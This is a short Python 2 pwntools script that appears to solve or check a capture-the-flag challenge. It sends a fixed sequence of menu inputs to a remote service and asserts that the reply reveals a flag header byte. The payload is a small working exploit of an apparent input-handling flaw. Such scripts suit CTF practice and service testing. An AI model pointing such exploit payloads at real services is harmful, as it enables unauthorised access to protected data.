#!/usr/bin/env python2

from pwn import *
import sys

payload = """2
1
2
asdf
01000000
0
1
1000000
"""

def main():

    host = sys.argv[1]
    port = int(sys.argv[2])

    r = remote(host, port)

    r.send(payload)
    s = r.readall()
    assert "Checking input" in s
    assert "Flag header byte: O" in s
    assert s.count("Flag") == 1


    sys.exit(0)


if __name__ == '__main__':
    main()
    

